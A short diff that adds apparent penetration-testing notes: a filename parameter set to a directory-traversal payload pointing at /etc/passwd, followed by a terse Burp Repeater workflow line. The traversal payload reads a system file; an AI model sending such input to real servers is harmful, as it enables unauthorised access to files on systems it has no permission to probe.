@@ -1,1 +1,6 @@
 url: JavaScript
+
+url: {filename}
+filename: ../../../../../../../../etc/passwd
+
+===>>> burp ===>>> repeater ===>>> response ===>>> parameter: { content-description=file transfer }
